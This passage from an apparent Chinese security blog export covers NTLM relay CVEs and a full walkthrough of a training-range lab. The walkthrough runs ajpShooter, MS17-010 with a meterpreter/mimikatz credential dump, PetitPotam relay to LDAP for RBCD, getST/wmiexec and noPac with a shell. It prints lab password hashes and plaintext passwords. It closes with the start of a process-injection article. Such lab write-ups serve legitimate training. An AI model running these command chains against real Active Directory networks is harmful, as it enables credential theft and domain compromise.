hack.lab&#x2F;NoPKI02\\$:123.com -dc-ip 20.20.20.5</span><br><span class=\"line\">export KRB5CCNAME&#x3D;...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Relay2EWS\"><a href=\"#Relay2EWS\" class=\"headerlink\" title=\"Relay2EWS\"></a>Relay2EWS</h3><p>Exchange 的认证也是支持NTLM SSP的。可以relay，从而收发邮件，代理等等。工具：<a href=\"https://github.com/Arno0x/NtlmRelayToEWS\">https://github.com/Arno0x/NtlmRelayToEWS</a></p>\n<h3 id=\"CVE\"><a href=\"#CVE\" class=\"headerlink\" title=\"CVE\"></a>CVE</h3><p>在Relay的攻击中，关于签名完整性的CVE绝对是至关重要的，如果能够无视签名完整性的保护，能大大扩宽攻击路径</p>\n<ul>\n<li>CVE-2015-0005</li>\n<li>删除 MIC（CVE-2019-1040）</li>\n<li>窃取会话密钥（CVE-2019-1019）</li>\n<li>删除 MIC 2（CVE-2019-1166）</li>\n<li>CVE-2019-1338</li>\n</ul>\n<h4 id=\"CVE-2015-0005\"><a href=\"#CVE-2015-0005\" class=\"headerlink\" title=\"CVE-2015-0005\"></a>CVE-2015-0005</h4><p>域环境下，认证服务器会通过NETLOGON把type 1,type 2,type 3全部发给域控，通过认证后证服务器就会通过NETLOGON去找域控索要key_exchange_key，该漏洞为：不是只有认证服务器才能找域控索要key_exchange_key，只要是机器用户来索要key_exchange_key，域控都会给，并没有做鉴权。</p>\n<p>影响范围：Windows Server 2003 - Windows Server 2012 R2</p>\n<p>在smbrelayx.py中可完成攻击，不过在impacket_0.11版本中被移除</p>\n<h4 id=\"CVE-2019-1040\"><a href=\"#CVE-2019-1040\" class=\"headerlink\" title=\"CVE-2019-1040\"></a>CVE-2019-1040</h4><p>作用：绕过mic，无视签名，直接中继</p>\n<p>原理：无需篡改 msvAvFlag 字段即可从消息中删除 MIC 的方法，只需将其与版本字段以及一些其他协商标志一起从消息中删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）</span><br><span class=\"line\">2. 从NTLM_AUTHENTICATE消息中删除MIC</span><br><span class=\"line\">3. 从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）</span><br><span class=\"line\">4. 取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION</span><br></pre></td></tr></table></figure>\n\n<p>影响范围：&lt; Windows Server 2019、Windows 10</p>\n<p>补丁：KB4503267、KB4503294</p>\n<h4 id=\"CVE-2019-1019\"><a href=\"#CVE-2019-1019\" class=\"headerlink\" title=\"CVE-2019-1019\"></a>CVE-2019-1019</h4><p>应用场景：HTTP -&gt; SMB，impacket中使用<a href=\"https://github.com/SecureAuthCorp/impacket/pull/635\">^5</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.&#x2F;ntlmrelayx.py -machine-account domain&#x2F;machineAccountName -machine-hashes LM:NT -domain DOMAIN -t targetIP -remove-target -smb2support</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"CVE-2019-1166\"><a href=\"#CVE-2019-1166\" class=\"headerlink\" title=\"CVE-2019-1166\"></a>CVE-2019-1166</h4><p>作用：还是绕过mic，无视签名，直接中继</p>\n<p>原理：诱使服务器误认为该消息不包含 MIC，从而允许我们修改 NTLM 身份验证流程的任何阶段</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 取消设置 NTLM_NEGOTIATE 消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN、NTLMSSP_NEGOTIATE_SIGN）</span><br><span class=\"line\">2. 在 NTLM_CHALLENGE 消息中注入一个恶意的 msvAvFlag 字段，其值为零</span><br><span class=\"line\">3. 从 NTLM_AUTHENTICATE 消息中删除 MIC</span><br><span class=\"line\">4. 取消设置 NTLM_AUTHENTICATE 消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN、NTLMSSP_NEGOTIATE_SIGN、NEGOTIATE_KEY_EXCHANGE、NEGOTIATE_VERSION</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h2 id=\"NTLM-Reflect\"><a href=\"#NTLM-Reflect\" class=\"headerlink\" title=\"NTLM Reflect\"></a>NTLM Reflect</h2><p>NTLM 反射到自身，其实作用就是提权，大部分关于土豆系列，后续再单独写土豆吧</p>\n<ul>\n<li>CVE-2025-33073</li>\n<li>土豆提权</li>\n</ul>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>NTLM:</p>\n<p><a href=\"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/760a9788-bd32-4d9e-87ad-2aa5970786ac\">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/760a9788-bd32-4d9e-87ad-2aa5970786ac</a></p>\n<p><a href=\"https://davenport.sourceforge.net/ntlm.htm\">https://davenport.sourceforge.net/ntlm.htm</a></p>\n<p>Downgrade：</p>\n<p><a href=\"https://www.r-tec.net/r-tec-blog-netntlmv1-downgrade-to-compromise.html\">NetNTLMv1 Downgrade to compromise</a></p>\n<p><a href=\"https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/\">NTLMv1 vs NTLMv2: Digging into an NTLM Downgrade Attack</a></p>\n<p><a href=\"https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D\">Windows下的密码hash-Net-NTLMv1介绍</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/350726.html\">关于NTLM 降级攻击的点点研究</a></p>\n<p><a href=\"https://www.mistiny.com/index.php/2024/06/24/433/\">NTLM 降级攻击技巧</a></p>\n<p><a href=\"https://github.com/eladshamir/Internal-Monologue\">https://github.com/eladshamir/Internal-Monologue</a></p>\n<p><a href=\"https://www.hackingarticles.in/ntlm-downgrade-attack-internal-monologue/\">NTLM Downgrade Attack: Internal Monologue</a></p>\n<p>PTH：</p>\n<p><a href=\"https://xz.aliyun.com/news/6647\">深入研究Pass-the-Hash攻击与防御</a></p>\n<p>CVE：</p>\n<p><a href=\"https://www.coresecurity.com/core-labs/advisories/windows-pass-through-authentication-methods-improper-validation\">CVE-2015-0005</a></p>\n<p><a href=\"https://www.crowdstrike.com/en-us/blog/from-the-archives-drop-the-mic-cve-2019-1040/\">CVE-2019-1040</a></p>\n<p><a href=\"https://www.crowdstrike.com/en-us/blog/active-directory-ntlm-attack-security-advisory/\">CVE-2019-1166</a></p>\n<p><a href=\"https://project-zero.issues.chromium.org/issues/42450897\">CVE-2019-1019</a></p>\n<p>Relay：</p>\n<p><a href=\"https://en.hackndo.com/ntlm-relay/\">NTLM Relay</a></p>\n<p><a href=\"https://daiker.gitbook.io/windows-protocol/ntlm-pian\">windows-protocol-NTLM 篇</a></p>\n<p><a href=\"https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\">【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)</a></p>\n<p><a href=\"https://www.freebuf.com/articles/network/383408.html\">一文详解Ntlm Relay</a></p>\n<p><a href=\"https://forum.butian.net/share/1944\">红队域渗透NTLM Relay：强制认证方式总结</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/aemG5XwVdyzNbOBXztDUbA\">360 A-TEAM 带你走进 NTLM-Relay</a></p>\n<p><a href=\"https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-Relay/\">域渗透|Relay</a></p>\n<p><a href=\"https://www.raingray.com/archives/2474.html\">https://www.raingray.com/archives/2474.html</a></p>\n<p><a href=\"https://github.com/fortra/impacket/pull/1305\">https://github.com/fortra/impacket/pull/1305</a></p>\n<p><a href=\"https://github.com/SecureAuthCorp/impacket/pull/635\">https://github.com/SecureAuthCorp/impacket/pull/635</a></p>\n<p>Relay Attack：</p>\n<p><a href=\"https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/\">How to Exploit Active Directory ACL Attack Paths Through LDAP Relaying Attacks</a></p>\n<p><a href=\"https://forum.butian.net/share/1945\">红队域渗透NTLM Relay：中继后攻击思路总结</a></p>\n<p><a href=\"https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/\">PetitPotam – NTLM Relay to AD CS</a></p>\n<p><a href=\"https://forum.butian.net/share/1583\">ADCS小结</a></p>\n<p><a href=\"https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/\">Escalating privileges with ACLs in Active Directory</a></p>\n","categories":["内网渗透"]},{"title":"春秋云境-Spoofing","url":"/2025/05/28/Spoofing/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/a8ce8e905ae443ac02a9f110f7ea59c6.png\" style=\"zoom:67%;\" />\n\n<table>\n<thead>\n<tr>\n<th>172.22.11.76</th>\n<th>ubuntu</th>\n<th>外网 tomcat 服务器</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.11.45</td>\n<td>XR-DESKTOP.xiaorang.lab</td>\n<td>存在 MS17-010 漏洞的主机</td>\n</tr>\n<tr>\n<td>172.22.11.26</td>\n<td>XR-LCM3AE8B.xiaorang.lab</td>\n<td>WebClient 服务</td>\n</tr>\n<tr>\n<td>172.22.11.6</td>\n<td>XIAORANG-DC.xiaorang.lab</td>\n<td>存在 noPAC 漏洞的域控制器</td>\n</tr>\n</tbody></table>\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、nopac 利用，在MAQ=0也在项目介绍了怎么利用：<a href=\"https://github.com/Ridter/noPac\">https://github.com/Ridter/noPac</a></p>\n<p>二、内网Relay端口转发</p>\n<h1 id=\"Tomcat-ajp-文件包含\"><a href=\"#Tomcat-ajp-文件包含\" class=\"headerlink\" title=\"Tomcat ajp 文件包含\"></a>Tomcat ajp 文件包含</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python ajpShooter.py http:&#x2F;&#x2F;ip:8080&#x2F; 8009 &#x2F;WEB-INF&#x2F;web.xml read</span><br><span class=\"line\">python ajpShooter.py http:&#x2F;&#x2F;ip:8080&#x2F; 8009 &#x2F;upload&#x2F;2d8d1657...txt eval</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ms17-010\"><a href=\"#ms17-010\" class=\"headerlink\" title=\"ms17-010\"></a>ms17-010</h1><p>172.22.11.45 ms17</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; hashdump</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:48f6da83eb89a4da8a1cc963b855a799:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">meterpreter &gt; load kiwi</span><br><span class=\"line\">Loading extension kiwi...</span><br><span class=\"line\">  .#####.   mimikatz 2.2.0 20191125 (x64&#x2F;windows)</span><br><span class=\"line\"> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span><br><span class=\"line\"> ## &#x2F; \\ ##  &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )</span><br><span class=\"line\"> ## \\ &#x2F; ##       &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz</span><br><span class=\"line\"> &#39;## v ##&#39;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class=\"line\">  &#39;#####&#39;         &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com  ***&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">Success.</span><br><span class=\"line\">meterpreter &gt; creds_all</span><br><span class=\"line\">[+] Running as SYSTEM</span><br><span class=\"line\">[*] Retrieving all credentials</span><br><span class=\"line\">msv credentials</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">Username     Domain    NTLM                              SHA1</span><br><span class=\"line\">--------     ------    ----                              ----</span><br><span class=\"line\">XR-DESKTOP$  XIAORANG  0498507a97312f834d671acdc616ba9d  d12705c4431473386ce8a5a7942a3beffda04f40</span><br><span class=\"line\">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br><span class=\"line\"></span><br><span class=\"line\">wdigest credentials</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">Username     Domain    Password</span><br><span class=\"line\">--------     ------    --------</span><br><span class=\"line\">(null)       (null)    (null)</span><br><span class=\"line\">XR-DESKTOP$  XIAORANG  AM&amp;:&#x3D;4^NSbVU\\Ke-XklyW8eB&quot;?&#39;5ldu&#x2F;0z9y@Yt3*5I*.&gt;MNcU#&gt;Scjm$q+3EM KoU-C&amp;D\\.,-I -,$40cEKUJcI8@yCCvf!b)aP&lt;kkc*3!?*VY\\I&lt;xW($)o</span><br><span class=\"line\">yangmei      XIAORANG  xrihGHgoNZQ</span><br><span class=\"line\"></span><br><span class=\"line\">kerberos credentials</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">Username     Domain        Password</span><br><span class=\"line\">--------     ------        --------</span><br><span class=\"line\">(null)       (null)        (null)</span><br><span class=\"line\">xr-desktop$  XIAORANG.LAB  (null)</span><br><span class=\"line\">xr-desktop$  XIAORANG.LAB  AM&amp;:&#x3D;4^NSbVU\\Ke-XklyW8eB&quot;?&#39;5ldu&#x2F;0z9y@Yt3*5I*.&gt;MNcU#&gt;Scjm$q+3EM KoU-C&amp;D\\.,-I -,$40cEKUJcI8@yCCvf!b)aP&lt;kkc*3!?*VY\\I&lt;xW($)o</span><br><span class=\"line\">yangmei      XIAORANG.LAB  xrihGHgoNZQ</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>拿到凭证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">XR-DESKTOP$  XIAORANG  0498507a97312f834d671acdc616ba9d</span><br><span class=\"line\">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841</span><br><span class=\"line\">yangmei      XIAORANG.LAB  xrihGHgoNZQ</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Webdav-NTLM-Relay\"><a href=\"#Webdav-NTLM-Relay\" class=\"headerlink\" title=\"Webdav NTLM Relay\"></a>Webdav NTLM Relay</h1><p>使用 CME 的 webdav 模块检测 webclient 服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q crackmapexec smb 172.22.11.0&#x2F;24 -u yangmei -p xrihGHgoNZQ -M webdav</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250528012753816.png\" alt=\"image-20250528012753816\"></p>\n<p>再使用 CME 的 PetitPotam 模块检测，是否可以进行强制认证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q crackmapexec smb 172.22.11.6&#x2F;24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure>\n\n<p>综上，172.22.11.26 存在webclient服务，能打一个NTLM Relay</p>\n<p>尝试使用 addcomputer 添加一个机器账号但是发现当前域内的 <code>MAQ=0</code> ，也就无法新增账号了，但是可以利用现有的机器凭证 <code>XR-DESKTOP$</code> 去做RBCD</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250528021243990.png\" alt=\"image-20250528021243990\"></p>\n<p>配置端口转发</p>\n<p> kali写ssh公钥到入口靶机，然后进行ssh端口转发</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh root@39.98.119.133 -D 1080 -R 81:127.0.0.1:80</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250528025748783.png\" alt=\"image-20250528025748783\"></p>\n<p>入口靶机使用iox</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.&#x2F;iox fwd -l 80 -r 127.0.0.1:81</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250528025820330.png\" alt=\"image-20250528025820330\"></p>\n<p>ntlmrelayx 开启监听，中继172.22.11.26的认证到域控，设置可控账号 <code>XR-DESKTOP$</code> 实现RBCD</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;172.22.11.6 --escalate-user &#39;XR-DESKTOP$&#39; --delegate-access</span><br><span class=\"line\"></span><br><span class=\"line\">proxychains4 -q impacket-PetitPotam -u &quot;yangmei&quot; -p &quot;xrihGHgoNZQ&quot; -d xiaorang.lab -dc-ip 172.22.11.6 ubuntu@80&#x2F;test 172.22.11.26</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250528025940107.png\" alt=\"image-20250528025940107\"></p>\n<p>申请 ST，PTT</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-getST xiaorang.lab&#x2F;&#39;XR-DESKTOP$&#39; -hashes &#39;:0498507a97312f834d671acdc616ba9d&#39; -spn cifs&#x2F;XR-LCM3AE8B.xiaorang.lab -impersonate Administrator -dc-ip 172.22.11.6</span><br><span class=\"line\"></span><br><span class=\"line\">proxychains4 -q impacket-wmiexec xiaorang.lab&#x2F;Administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -dc-ip 172.22.11.6</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250528031417169.png\" alt=\"image-20250528031417169\"></p>\n<p>抓密码： zhanghui/1232126b24cdf8c9bd2f788a9d7c7ed1</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250528032009636.png\" alt=\"image-20250528032009636\"></p>\n<h1 id=\"nopac\"><a href=\"#nopac\" class=\"headerlink\" title=\"nopac\"></a>nopac</h1><p>前面说到 MAQ=0时无法直接利用，需要找到 CreateChild 账户，并使用该账户进行利用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; AdFind.exe -sc getacls -sddlfilter ;;&quot;[CR CHILD]&quot;;computer;; -recmute</span><br><span class=\"line\"></span><br><span class=\"line\">AdFind V01.62.00cpp Joe Richards (support@joeware.net) October 2023</span><br><span class=\"line\"></span><br><span class=\"line\">Using server: XIAORANG-DC.xiaorang.lab:389</span><br><span class=\"line\">Directory: Windows Server 2019 (10.0.17763.1)</span><br><span class=\"line\">Base DN: DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\"></span><br><span class=\"line\">dn:DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;Users,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;Computers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT];[CR CHILD];computer;;S-1-5-21-3598443049-773813974-2432140268-1112</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;;[CR CHILD][DEL CHILD];computer;;BUILTIN\\Account Operators</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">dn:OU&#x3D;Domain Controllers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;XIAORANG-DC,OU&#x3D;Domain Controllers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;Domain Computers,CN&#x3D;Users,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;XR-LCM3AE8B,CN&#x3D;Computers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;S-1-5-21-3598443049-773813974-2432140268-1112</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;lishuai,CN&#x3D;Users,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;sunyu,CN&#x3D;Users,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;chenchen,CN&#x3D;Users,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;MA_Admin,CN&#x3D;Users,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;zhanghui,CN&#x3D;Users,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;XR-DESKTOP,CN&#x3D;Computers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;S-1-5-21-3598443049-773813974-2432140268-1112</span><br><span class=\"line\">&gt;nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT][INHERITED];[CR CHILD];computer;;XIAORANG\\MA_Admin</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">241 Objects returned</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">也可以直接查询 CN&#x3D;computers 容器的安全描述符，查看谁对其有 [CR CHILD] 权限：</span><br><span class=\"line\">AdFind.exe -b &quot;CN&#x3D;Computers,DC&#x3D;xiaorang,DC&#x3D;lab&quot; nTSecurityDescriptor -sddl+++</span><br></pre></td></tr></table></figure>\n\n<p>发现MA_Admin 组的 zhanghui 用户对域内 computer container 有能够创建对象的权限，即添加机器账户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python noPac.py xiaorang.lab&#x2F;zhanghui -hashes :1232126b24cdf8c9bd2f788a9d7c7ed1 -use-ldap -create-child -dc-ip 172.22.11.6</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250528035949787.png\" alt=\"image-20250528035949787\"></p>\n<p>还能使用之前的机器账户 <code>XR-DESKTOP$</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python noPac.py xiaorang.lab&#x2F;&#39;XR-DESKTOP$&#39; -hashes &#39;:03e8d17f4da1797f6b69a9a7a23244c1&#39; -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name &#39;XR-DESKTOP$&#39; -old-hash &#39;:03e8d17f4da1797f6b69a9a7a23244c1&#39; -use-ldap -shell</span><br></pre></td></tr></table></figure>\n\n","categories":["云境靶场"]},{"title":"Process-Inject-壹","url":"/2024/07/09/Process-Injection/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/statehackers.jpg\" alt=\"statehackers\"></p>\n<a id=\"more\"></a>\n\n<p>学习代码存放在：<a href=\"https://github.com/yongsheng220/ProcessInject\">https://github.com/yongsheng220/ProcessInject</a></p>\n<p>进程注入是一种在单独的活动进程中的地址空间中执行任意代码的方法。 在一个进程的上下文中运行特定代码，则有可能访问该进程的内存，系统或网络资源以及提升权限。即将 shellcode/PE “注入” 至某个进程中来尝试规避检测。</p>\n<p>根据ATT&amp;CK，针对进程注入有以下12种分类：</p>\n<ul>\n<li>T1055.001– Dynamic-link Library Injection（dll注入）</li>\n<li>T1055.002– Portable Executable Injection（PE注入）</li>\n<li>T1055.003– Thread Execution Hijacking（线程劫持）</li>\n<li>T1055.004– Asynchronous Procedure Call（APC注入）</li>\n<li>T1055.005– Thread Local Storage（线程本地存储TLS注入）</li>\n<li>T1055.008– Ptrace System Calls（Linux下的Ptrace注入）</li>\n<li>T1055.009– Proc Memory</li>\n<li>T1055.011– Extra Window Memory Injection（额外窗口内存注入）</li>\n<li>T1055.012– Process Hollowing（傀儡进程/进程镂空）</li>\n<li>T1055.013– Process Doppelganging（进程替身/进程分身）</li>\n<li>T1055.014– VDSO Hijacking</li>\n<li>T1055.015– ListPlanting（滥用listview控件）</li>\n</ul>\n<p>整个关系图如下 <a href=\"https://mp.weixin.qq.com/s/9v6qGqHlzD6Ee3ICOeuVvQ\">ATT&amp;CK-防御绕过之进程注入攻防分析</a>：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240613160104871.png\"></p>\n<h1 id=\"DLL注入\"><a href=\"#DLL注入\" class=\"headerlink\" title=\"DLL注入\"></a>DLL注入</h1><p>根据ATT&amp;CK框架，该方法还存在三种变体，我将该方法以及变体总结为以下手法</p>\n<ul>\n<li>Classic dll injection:（常规dll注入）</li>\n<li>reflective DLL injection（反射dll注入）</li>\n<li>memory module（内存模块）</li>\n<li>Module Stomping/Overloading 或 DLL Hollowing（模块镂空）</li>\n</ul>\n<h2 id=\"经典Dll注入\"><a href=\"#经典Dll注入\" class=\"headerlink\" 